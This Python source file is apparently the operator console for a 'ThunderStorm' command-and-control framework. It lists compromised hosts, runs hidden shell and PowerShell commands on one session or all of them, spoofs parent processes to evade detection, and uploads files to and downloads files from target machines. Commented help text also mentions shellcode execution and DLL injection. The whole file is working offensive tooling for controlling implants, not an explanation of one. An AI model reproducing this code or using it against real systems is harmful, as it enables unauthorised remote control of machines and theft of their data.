#!/usr/bin/python3

from cmd import Cmd
from sys import argv
from os import getenv
from shlex import split
from sched import scheduler
from sys import exit, stderr
from time import time, sleep
from requests import session
from datetime import datetime
from os.path import expandvars
from queue import Queue, Empty
from traceback import format_exc
from collections import namedtuple
from threading import Event, Thread
from argparse import ArgumentParser
from base64 import b64decode, b64encode
from concurrent.futures import ThreadPoolExecutor

# Disabled / removed args text.
#  --all
#  -y          file      Execute shellcode contained in the filepath provided.
#  --shellcode file        Will select any process with the same (or higher) privilege
#                          level and will not target the agent process.
#  -g          path      Inject and load DLL indicated by this LOCAL path. If this value
#  --dll       path        is empty, '-f' can be used to specify a DLL to be uploaded
#                          to the target and then loaded.
HELP = """ThunderStorm C2 CLI
Usage: {exe} [-h] [-s url] [-k] [-l] [-q] [-x] [-j job] [-i] [-c cmd]
               [-m] [-y] [-a] [-t secs] [-u file] [-d file] [-f file] [host]

Positional Arguments:
  SID                   Session ID to use for actions.

Optional Arguments:
  -h                    Show this help message and exit.
  --help
  -s          url       RPC Server URL. This may be specified in the
  --rpc       url         "$THUNDERSTORM_RPC" environment variable instead.
  -k                    Ignore SSL certificate errors.
  --insecure
  -l                    List all connected Sessions.
  --list
  -q                    Query info about a connected Session or all
  --info                  Sessions (if using the "--all" flag).
  -b                    Get a list of Jobs for the Session or all
  --queue                 Sessions (if using the "--all" flag).
  -p                    Remove a connected Session.
  --delete
  --shutdown            Shutdown a Session while removing.
  -x                    List all enabled Listeners.
  --listeners
  -j          job       Retrieve results for a specific Job ID.
  --job       job
  -c          cmd       Specify a command to run on the Session.
  --cmd       cmd         See the "COMMAND PREFIXES" section for more info.
  -t          secs
  --timeout   secs      Timeout to wait for Job results in seconds.
  -i                      Enter interactive console mode.
  --interact
  -r                    Don't wait for result of submitted Job and return
  --no-wait               instantly. Job ID may be queried later.
  -m                    Don't block or capture output. Returns instantly.
  --detach
  -z                    Enable the SHOW_WINDOW flag on executed commands.
  --no-hide
  -a                    Run command on all sessions. Applies only to
                          Sessions, Commands and Jobs.
  -u          file      Upload a server file to this client location.
  --upload    file
  -d          file      Download this client file from this location. Output
  --download  file        defaults to standard output. Use '-f' to modify behavior.
  -f          file      File operation target. output for Download and
  --file      file        input for Upload and DLL (if used).

Command Prefixes:
  Single character prefixes may be used to denote specific command types
  and are interpreted differently by the RPC server. There does not need
  to be a space after the prefix.

  .       Execute the command under the OS-specific shell.
            This is determined by the host during runtime.
  $       Execute the command under PowerShell. This will
            fail if PowerShell is not installed on the host.
  !       Parse the command as a system command. These can be calls
            to change the Sleep/Jitter settings or shutting down
            the agent.
"""
BOOLEANS = ["1", "t", "true", "yes", "on"]
HELP_TEXT = (
    "Commands entered in this console are parsed as direct commands "
    "(think like passed to run).\nBy default commands are run under the host process and are "
    "hidden.\nThe following commands can be used to modify how commands operate:\n"
    " pen"
    " ppid <process_id>\n"
    "  Specify a direct process id to spoof under. This disables most of the other spoofing options.\n"
    " pname <process>,[process]...\n"
    "  This command can specify names of processes to be used for spoofing. Takes a comma seperated\n"
    "  list. An empty list sets this to none. (which selects all processes).\n"
    " pexclude <"
)

#
# Need to add a function to remove Sessions
#  Update the HELP_TEXT
#
#  DLL Injection and Code also


Result = namedtuple("Result", ["data", "error", "exit", "pid", "type"])
Action = namedtuple("Action", ["job", "host", "type", "output", "command", "timeout"])


class TdsShell(Cmd):
    def __init__(self, rpc, host, timeout):
        Cmd.__init__(self)
        self.rpc = rpc
        self.host = host
        self.hide = True
        self.timeout = timeout
        self.q = TdsQueue(rpc)
        self.filter = TdsFilter()
        self.prompt = f"{host} > "
        self.q.start()

    def close(self):
        self.q.alive.set()
        self.q.done.wait()

    def emptyline(self):
        return None

    def do_exit(self, _):
        raise KeyboardInterrupt()

    def do_jobs(self, _):
        self.rpc.list_jobs(self.host, False)

    def do_info(self, _):
        self.rpc.info(self.host)

    def do_help(self, _):
        print(HELP_TEXT)

    def do_job(self, job):
        if job is None or len(job) == 0:
            return self.do_jobs(None)
        self.rpc.result(self.host, job, False, 0, None)

    def do_run(self, cmd):
        if cmd is None or len(cmd) == 0:
            return
        if len(cmd) < 1:
            print("[!] Command must be at least 1 characters!")
        self.default(f".{cmd}")

    def do_hup(self, cmd):
        if cmd is None or len(cmd) == 0:
            return
        if len(cmd) < 1:
            print("[!] Command must be at least 1 characters!")
        try:
            self.rpc._execute(self.host, cmd, True, self.hide, self.filter)
        except ValueError as err:
            print(f"[!] Error: {err}")

    def do_pwsh(self, cmd):
        if cmd is None or len(cmd) == 0:
            return
        if len(cmd) < 1:
            print("[!] Command must be at least 1 character!")
        self.default(f"${cmd}")

    def do_ppid(self, pid):
        if pid is None or len(pid) == 0:
            self.filter.pid = None
            return
        try:
            p = int(pid)
        except ValueError:
            return print(f'[!] "{pid}" is not a valid integer!')
        if p <= 0:
            return print("[!] PID must be greater than zero!")
        self.filter.pid = p

    def do_pclear(self, _):
        self.filter.pid = None
        self.filter.session = None
        self.filter.exclude = None
        self.filter.include = None
        self.filter.fallback = None
        self.filter.elevated = None

    def default(self, cmd):
        if cmd is None or len(cmd) == 0:
            return
        if len(cmd) < 1:
            print("[!] Command must be at least 1 character!")
        try:
            self.q.input.put(
                Action(
                    self.rpc._execute(self.host, cmd, False, self.hide, self.filter),
                    self.host,
                    "execute",
                    None,
                    cmd,
                    self.timeout,
                ),
                block=False,
            )
        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err

    def do_shell(self, cmd):
        if cmd is None or len(cmd) == 0:
            return
        if len(cmd) < 1:
            print("[!] Command must be at least 1 character!")
        self.default(f".{cmd}")

    def do_pname(self, name):
        if name is None or len(name) == 0:
            self.filter.include = None
            return
        e = list()
        n = 0
        for x in range(0, len(name)):
            if name[x] == " " or name[x] == ",":
                if x - n == 0:
                    n = x + 1
                    continue
                e.append(name[n:x].strip())
                n = x + 1
        if len(e) == 0:
            e.append(name.strip())
        elif n < len(name):
            e.append(name[n:].strip())
        self.filter.include = e
        del e
        del n

    def do_sleep(self, time):
        self.default(f"!sleep {time}")

    def do_jitter(self, per):
        self.default(f"!jitter {per}")

    def do_upload(self, args):
        a = split(args)
        if len(a) != 2 or len(a[0]) == 0 or len(a[1]) == 0:
            return print("[!] upload <local src> <target dest>")
        try:
            self.q.input.put(
                Action(
                    self.rpc._upload(self.host, _exp(a[0]), _exp(a[1])),
                    self.host,
                    "upload",
                    None,
                    a[1],
                    self.timeout,
                ),
                block=False,
            )
        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err

    def do_download(self, args):
        a = split(args)
        if len(a) < 1 or len(a) > 2 or len(a[0]) == 0:
            return print("[!] download <target src> [local dest]")
        if len(a) == 1 or len(a[1]) == 0:
            o = None
        else:
            o = _exp(a[1])
        try:
            self.q.input.put(
                Action(
                    self.rpc._download(self.host, _exp(a[0])),
                    self.host,
                    "download",
                    o,
                    a[0],
                    self.timeout,
                ),
                block=False,
            )
        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err

    def do_phidewin(self, enable):
        if enable is None or len(enable) == 0:
            self.hide = True
            return
        self.hide = enable.lower().strip() in BOOLEANS

    def do_pexclude(self, exclude):
        if exclude is None or len(exclude) == 0:
            self.filter.exclude = None
            return
        e = list()
        n = 0
        for x in range(0, len(exclude)):
            if exclude[x] == " " or exclude[x] == ",":
                if x - n == 0:
                    n = x + 1
                    continue
                e.append(exclude[n:x].strip())
                n = x + 1
        if len(e) == 0:
            e.append(exclude.strip())
        elif n < len(exclude):
            e.append(exclude[n:].strip())
        self.filter.exclude = e
        del e
        del n

    def do_pdesktop(self, desktop):
        if desktop is None or len(desktop) == 0:
            self.filter.session = None
            return
        self.filter.session = desktop.lower().strip() in BOOLEANS

    def do_pfallback(self, enabled):
        if enabled is None or len(enabled) == 0:
            self.filter.fallback = None
            return
        self.filter.fallback = enabled.lower().strip() in BOOLEANS

    def do_pelevated(self, elevated):
        if elevated is None or len(elevated) == 0:
            self.filter.elevated = None
            return
        self.filter.elevated = elevated.lower().strip() in BOOLEANS


class TdsQueue(Thread):
    def __init__(self, rpc):
        Thread.__init__(self)
        self.rpc = rpc
        self.act = list()
        self.done = Event()
        self.alive = Event()
        self.input = Queue()
        self.sh = scheduler(timefunc=time, delayfunc=sleep)
        self.ex = ThreadPoolExecutor(thread_name_prefix="TdsQueue", max_workers=32)

    def run(self):
        while not self.alive.is_set():
            x = None
            try:
                x = self.input.get(block=True, timeout=1)
            except Empty:
                pass
            if x is None:
                continue
            if not isinstance(x, Action):
                continue
            if not isinstance(x.type, str) or len(x.type) == 0:
                continue
            if not isinstance(x.host, str) or not isinstance(x.job, int):
                continue
            if not isinstance(x.timeout, int) or x.timeout <= 0:
                x.timeout = 300
            e = Event()
            h = self.sh.enter(x.timeout, 1, e.set)
            self.ex.submit(self._wait, e, x, h)
            self.act.append(e)
            del x
        for i in self.act:
            i.set()
        self.ex.shutdown(True)
        self.done.set()

    def close(self):
        self.alive.set()
        self.ex.shutdown(False)
        self.done.wait()

    def _wait(self, event, job, handle):
        try:
            while not event.is_set():
                if self.rpc._process(
                    job.host, job.job, job.type, job.command, job.output
                ):
                    break
                sleep(1)
                self.sh.run(False)
        except Exception as err:
            print(f"[!] Exception during Queue runtime: {err}!", file=stderr)
        self.sh.cancel(handle)
        self.act.remove(event)
        event.set()


class TdsFilter(object):
    def __init__(self):
        self.pid = None
        self.session = None
        self.fallback = None
        self.evelated = None
        self.exclude = list()
        self.include = list()

    def json(self):
        r = dict()
        if isinstance(self.session, bool):
            r["session"] = self.session
        if isinstance(self.evelated, bool):
            r["elevated"] = self.evelated
        if isinstance(self.fallback, bool):
            r["fallback"] = self.fallback
        if isinstance(self.pid, int) and self.pid > 0:
            r["pid"] = self.pid
        if isinstance(self.exclude, list) and len(self.exclude) > 0:
            r["exclude"] = self.include
        if isinstance(self.include, list) and len(self.include) > 0:
            r["include"] = self.include
        return r


class TdsRPCInterface(object):
    def __init__(self, rpc, insecure=False):
        self.rpc = rpc
        self.http = session()
        if insecure:
            self.http.verify = False

    def info_all(self):
        e = self._sessions()
        for s in e:
            self.info(s["id"])
            print()
        del e

    def _jobs(self, host):
        r = self.http.get(f"{self.rpc}/api/v1/session/{host}/job", json=True)
        if r.status_code != 200:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/job" non-200 status code {r.status_code}!'
            )
        d = r.json()
        del r
        if not isinstance(d, dict):
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/job" did not return a dict!'
            )
        return d

    def list_sessions(self):
        e = self._sessions()
        if not isinstance(e, list) or len(e) == 0:
            return
        t = datetime.now()
        print(
            f'{"ID":9}{"Hostname":24}{"IP":15}{"OS":10}{"Arch":6}{"User":32}{"PID":7}{"Last":8}\n{"="*115}'
        )
        for s in e:
            print(
                f'{s["id"]:9}{s["device"]["hostname"]:24}{_get_ip(s):15}{s["device"]["os"]:10}{s["device"]["arch"]:6}'
                f'{("*" if s["device"]["elevated"] else " ") + s["device"]["user"]:32}{s["device"]["pid"]:<7}'
                f'{_time_str(t, s["last"])}'
            )
        del t
        del e

    def info(self, session):
        r = self.http.get(f"{self.rpc}/api/v1/session/{session}", json=True)
        if r.status_code != 200:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{session}" non-200 status code {r.status_code}!'
            )
        d = r.json()
        del r
        if not isinstance(d, dict):
            raise ValueError(f'"{self.rpc}/api/v1/session" did not return a dict!')
        print(
            f'{"ID:":<10}{d["id"]}\n{"Hostname:":<10}{d["device"]["hostname"]}\n'
            f'{"User:":<10}{("*" if d["device"]["elevated"] else "") + d["device"]["user"]}\n'
            f'{"OS:":<10}{d["device"]["os"]}\n{"Version:":<10}{d["device"]["version"]}\n'
            f'{"PID:":<10}{d["device"]["pid"]}\n{"PPID:":<10}{d["device"]["ppid"]}\nNetwork:'
        )
        for i in d["device"]["network"]:
            print(f'  {i["name"]}: {", ".join(i["ip"])}')
        t = datetime.now()
        print(
            f'{"Sleep:":<10}{int(int(d["sleep"])//1000000000)}s\n{"Jitter:":<10}{d["jitter"]}%\n'
            f'{"Last:":<10}{_time_str(t, d["last"])}\n{"Created":<10}{_time_str(t, d["created"])}'
        )
        del t
        del d

    def _result(self, host, job):
        r = self.http.get(f"{self.rpc}/api/v1/session/{host}/{job}/result", json=True)
        if r.status_code == 404:
            return None
        if r.status_code == 204:
            return Result(None, None, 0, 0, None)
        if r.status_code != 200 and r.status_code != 206:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/{job}/result" '
                f'non-404/200 status code {r.status_code}! {r.content.decode("UTF-8")}'
            )
        v = r.json()
        if not isinstance(v, dict):
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/{job}/result" did not return a list!'
            )
        if r.status_code == 206:
            if "error" not in v:
                return Result(None, "Unspecified Error", 0, 0, None)
            return Result(None, v["error"], 0, 0, None)
        if "data" in v:
            return Result(
                b64decode(v["data"]),
                None,
                v.get("exit", 0),
                v.get("pid", 0),
                v.get("type", None),
            )
        return Result(
            None, None, v.get("exit", 0), v.get("pid", 0), v.get("type", None)
        )

    def _sessions(self, host=None):
        u = f"{self.rpc}/api/v1/session"
        if isinstance(host, str) and len(host) > 0:
            u = f"{u}/{host}"
        r = self.http.get(u, json=True)
        if r.status_code != 200:
            raise ValueError(f'"{u}" non-200 status code {r.status_code}!')
        d = r.json()
        del r
        if isinstance(d, dict):
            return d
        if not isinstance(d, list):
            raise ValueError(f'"{u}" did not return a list!')
        del u
        d.sort(key=lambda x: x["id"], reverse=True)
        return d

    def _listeners(self, name=None):
        u = f"{self.rpc}/api/v1/listener"
        if isinstance(name, str) and len(name) > 0:
            u = f"{u}/{name}"
        r = self.http.get(u, json=True)
        if r.status_code != 200:
            raise ValueError(f'"{u}" non-200 status code {r.status_code}!')
        d = r.json()
        del r
        if isinstance(d, dict):
            return d
        if not isinstance(d, list):
            raise ValueError(f'"{u}" did not return a list!')
        del u
        d.sort(key=lambda x: x["name"], reverse=True)
        return d

    def list_jobs(self, host, loop):
        if loop:
            e = self._sessions()
            if not isinstance(e, list) or len(e) == 0:
                return
            print(
                f'{"Host":9}{"ID":6}{"Type":5}{"Status":11}{"Start":10}{"Complete":10}{"Result"}\n{"="*60}'
            )
            for s in e:
                self._list_jobs(s["id"], True)
            return
        if not isinstance(host, str) or len(host) == 0:
            raise ValueError("Host ID must be specified!")
        self._list_jobs(host, False)

    def _download(self, host, file):
        if not isinstance(file, str) or len(file) == 0:
            raise ValueError("File path cannot be empty!")
        r = self.http.put(
            f"{self.rpc}/api/v1/session/{host}/download",
            json={"path": file},
        )
        if r.status_code != 201:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/download" non-201 status code {r.status_code}!'
            )
        d = r.json()
        if not isinstance(d, dict):
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/download" did not return a dict!'
            )
        if "id" not in d:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/download" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[*] {host}: Submitted Job ID is {j}.")
        return j

    def interact(self, host, timeout):
        s = TdsShell(self, host, timeout)
        try:
            s.cmdloop(
                'Welcome to the  Bolt  shell. Use the "help" command to display commands.\n'
                "Happy hacking!"
            )
        except Exception as err:
            print(f"[!] {err.__class__.__name__} {err}", file=stderr)
        except KeyboardInterrupt:
            print("[+] Closing interactive...")
        s.close()

    def _upload(self, host, file, dest):
        if not isinstance(file, str) or len(file) == 0:
            raise ValueError("File path cannot be empty!")
        if not isinstance(dest, str) or len(dest) == 0:
            raise ValueError("File destination cannot be empty!")
        with open(file, "rb") as f:
            b = b64encode(f.read()).decode("UTF-8")
        r = self.http.put(
            f"{self.rpc}/api/v1/session/{host}/upload",
            json={"path": dest, "data": b},
        )
        del b
        if r.status_code != 201:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/upload" non-201 status code {r.status_code}!'
            )
        d = r.json()
        if not isinstance(d, dict):
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/upload" did not return a dict!'
            )
        if "id" not in d:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/upload" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[*] {host}: Submitted Job ID is {j}.")
        return j

    def list_listeners(self, name=None):
        n = self._listeners(name)
        if not isinstance(n, list) or len(n) == 0:
            return
        print(f'{"Name":10}{"Bind Address":23}{"# Sessions"}\n{"="*45}')
        for e in n:
            print(f'{e["name"]:10}{e["address"]:23}{len(e["sessions"])}')
        del n

    def delete(self, host, shutdown=False):
        r = self.http.delete(
            f"{self.rpc}/api/v1/session/{host}", json={"shutdown": shutdown}
        )
        if r.status_code != 200:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}" non-200 status code {r.status_code}!'
            )

    def _list_jobs(self, host, host_prefix):
        d = self._jobs(host)
        if not isinstance(d, dict) and len(d) > 0:
            return
        if not host_prefix:
            print(
                f'{"ID":6}{"Type":5}{"Status":11}{"Start":10}{"Complete":10}{"Result"}\n{"="*50}'
            )
        t = datetime.now()
        e = list(d.values())
        del d
        e.sort(key=lambda x: x["start"], reverse=True)
        for j in e:
            if "id" not in j or "status" not in j or "type" not in j:
                continue
            if host_prefix:
                print(f'{j["host"]} ', end="")
            print(
                f'{j["id"]:<6}{j["type"]:<5}{j["status"].title():11}{_time_str(t, j["start"]):10}',
                end="",
            )
            if "complete" in j:
                print(f'{_time_str(t, j["complete"]):10}', end="")
            if "result" in j and isinstance(j["result"], int) and j["result"] > 0:
                print(f'{j["result"]}b', end="")
            if "error" in j and len("error") > 0:
                print(j["error"], end="")
            print()
        del t
        del e

    def _execute(self, host, cmd, detach, hide, f):
        if not isinstance(cmd, str) or len(cmd) == 0:
            raise ValueError("[!] Command cannot be empty!")
        p = {"cmd": cmd, "wait": not detach, "hide": hide}
        if isinstance(f, TdsFilter):
            d = f.json()
            if len(d) > 0:
                p["filter"] = d
            del d
        r = self.http.put(f"{self.rpc}/api/v1/session/{host}/exec", json=p)
        del p
        if r.status_code != 201:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/exec" non-201 status code '
                f'{r.status_code}! {r.content.decode("UTF-8")}'
            )
        d = r.json()
        if not isinstance(d, dict):
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/exec" did not return a dict!'
            )
        if "id" not in d:
            raise ValueError(
                f'"{self.rpc}/api/v1/session/{host}/exec" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[*] {host}: Submitted Job ID is {j}.")
        return j

    def _process(self, host, job, type, cmd, output):
        r = self._result(host, job)
        if not isinstance(r, Result):
            return False
        if isinstance(cmd, str) and len(cmd) > 0:
            print(f'[+] Job {host}\\{job} "{cmd}"', end="")
        else:
            print(f"[+] Job {host}\\{job}", end="")
        if isinstance(r.error, str) and len(r.error) > 0:
            print(f" error: {r.error}")
            return True
        if not isinstance(type, str) or len(type) == 0:
            type = r.type
        if type == "execute" or type is None:
            print(" returned.")
            if r.data is None:
                return True
            print(f'[+] PID: {r.pid}, Exit Result: {r.exit}\n{r.data.decode("UTF-8")}')
            return True
        print(" completed.")
        if type == "upload":
            return True
        if not isinstance(output, str) or len(output) == 0:
            print(r.data.decode("UTF-8"))
            return True
        with open(output, "wb") as f:
            f.write(r.data)
            f.flush()
        print(f'Saved to "{output}".')
        return True

    def upload(self, host, file, target, wait, timeout):
        j = self._upload(host, _exp(file), _exp(target))
        if not wait:
            return
        self._wait(host, j, timeout, "upload", target, None)

    def download(self, host, file, wait, timeout, output):
        j = self._download(host, file)
        if not wait:
            return
        self._wait(host, j, timeout, "download", file, _exp(output))

    def execute_all(self, cmd, detach, wait, timeout, hide):
        e = self._sessions()
        q = TdsQueue(self)
        q.start()
        for s in e:
            j = self._execute(s["id"], cmd, detach, hide, None)
            if not wait:
                continue
            q.input.put(Action(j, s["id"], "execute", None, cmd, timeout), block=False)
            del j
        del e
        try:
            if wait:
                sleep(1500)
            q.ex.shutdown(wait=wait)
        except KeyboardInterrupt:
            pass
        q.close()
        del q

    def execute(self, host, cmd, detach, wait, timeout, hide):
        j = self._execute(host, cmd, detach, hide, None)
        if not wait:
            return
        print(f"[*] Waiting {timeout} seconds for results...")
        self._wait(host, j, timeout, "execute", cmd)
        del j

    def _wait(self, host, job, timeout, type, cmd, output=None):
        t = scheduler(timefunc=time, delayfunc=sleep)
        e = Event()
        h = t.enter(timeout, 1, e.set)
        try:
            while not e.is_set():
                if self._process(host, job, type, cmd, output):
                    break
                sleep(1)
                t.run(False)
        except KeyboardInterrupt:
            pass
        try:
            t.cancel(h)
        except ValueError:
            pass
        e.set()
        del h
        del e
        del t

    def result(self, host, job, wait, timeout, output, type=None):
        if self._process(host, job, type, None, output):
            return
        if not wait:
            return
        self._wait(host, job, timeout, type, None, output)


def _help():
    print(HELP.format(exe=argv[0]))


def new_rpc():
    a = ArgumentParser(add_help=True)
    a.print_help = _help
    a.add_argument(
        "-s",
        "--rpc",
        type=str,
        dest="rpc",
        default=None,
        required=False,
    )
    a.add_argument(
        "-k",
        "--insecure",
        dest="insecure",
        action="store_true",
    )
    a.add_argument(
        "-l",
        "--list",
        dest="list",
        action="store_true",
    )
    a.add_argument(
        "-q",
        "--info",
        dest="info",
        action="store_true",
    )
    a.add_argument(
        "-p",
        "--delete",
        dest="delete",
        action="store_true",
    )
    a.add_argument(
        "--shutdown",
        dest="shutdown",
        action="store_true",
    )
    a.add_argument(
        "-b",
        "--queue",
        dest="jobs",
        action="store_true",
    )
    a.add_argument(
        "-x",
        "--listeners",
        dest="listeners",
        action="store_true",
    )
    a.add_argument(
        "-j",
        "--job",
        type=int,
        dest="job",
        default=None,
        required=False,
    )
    a.add_argument(
        "-c",
        "--cmd",
        type=str,
        dest="cmd",
        default=None,
        required=False,
    )
    a.add_argument(
        "-t",
        "--timeout",
        type=int,
        dest="timeout",
        default=300,
    )
    a.add_argument(
        "-i",
        "--interact",
        dest="interact",
        action="store_true",
    )
    a.add_argument(
        "-z",
        "--no-hide",
        dest="hide",
        action="store_false",
    )
    a.add_argument(
        "-r",
        "--no-wait",
        dest="wait",
        action="store_false",
    )
    a.add_argument(
        "-m",
        "--detach",
        dest="detach",
        action="store_true",
    )
    a.add_argument(
        "-a",
        "--all",
        dest="all",
        action="store_true",
    )
    a.add_argument(
        "-u",
        "--upload",
        type=str,
        dest="upload",
        default=None,
    )
    a.add_argument(
        "-d",
        "--download",
        type=str,
        dest="download",
        default=None,
    )
    a.add_argument(
        "-f",
        "--file",
        type=str,
        dest="file",
        default=None,
    )
    a.add_argument(
        type=str,
        dest="id",
        nargs="?",
        default=None,
    )
    p = a.parse_args()
    if not isinstance(p.rpc, str) or len(p.rpc) == 0:
        e = getenv("THUNDERSTORM_RPC")
        if not isinstance(e, str) or len(e) == 0:
            print("[!] RPC Server URL must be specified!", file=stderr)
            return None, None
        p.rpc = e
    return TdsRPCInterface(p.rpc), p


def _get_ip(s):
    if "network" not in s["device"]:
        return ""
    for i in s["device"]["network"]:
        if "ip" not in i:
            continue
        for n in i["ip"]:
            if n.startswith("127.0") or ":" in n:
                continue
            return n
    return ""


def _exp(path):
    return expandvars(path.replace("~/", "${HOME}/"))


def _time_str(n, s):
    if len(s) == 0:
        return ""
    v = datetime.fromisoformat(s).replace(tzinfo=None)
    m, n = divmod((n - v).seconds, 60)
    h, m = divmod(m, 60)
    del v
    if h > 0:
        return f"{h}h {m}m"
    if m > 0:
        return f"{m}m {n}s"
    return f"{n}s"


def _main(rpc, args):
    if args.list:
        return rpc.list_sessions()
    if args.listeners:
        return rpc.list_listeners()
    if args.jobs:
        return rpc.list_jobs(args.id, loop=args.all)
    if args.all and args.info:
        return rpc.info_all()
    if args.all and isinstance(args.cmd, str) and len(args.cmd) > 0:
        return rpc.execute_all(
            args.cmd, args.detach, args.wait, args.timeout, args.hide
        )
    if not isinstance(args.id, str) or len(args.id) == 0:
        raise ValueError("Host ID must be specified!")
    if args.job:
        return rpc.result(args.id, args.job, args.wait, args.timeout, args.file)
    if args.info:
        return rpc.info(args.id)
    if args.delete:
        return rpc.delete(args.id, args.shutdown)
    if args.interact:
        return rpc.interact(args.id, args.timeout)
    if isinstance(args.cmd, str) and len(args.cmd) > 0:
        return rpc.execute(
            args.id, args.cmd, args.detach, args.wait, args.timeout, args.hide
        )
    if isinstance(args.upload, str) and len(args.upload) > 0:
        return rpc.upload(args.id, args.file, args.upload, args.wait, args.timeout)
    if isinstance(args.download, str) and len(args.download) > 0:
        return rpc.download(args.id, args.download, args.wait, args.timeout, args.file)
    raise RuntimeError()


if __name__ == "__main__":
    r, p = new_rpc()
    if not isinstance(r, TdsRPCInterface):
        exit(1)
    try:
        _main(r, p)
    except RuntimeError:
        _help()
        exit(2)
    except Exception as err:
        print(
            f"[!] {err.__class__.__name__}: {err}\n{format_exc(limit=5)}", file=stderr
        )
        exit(1)
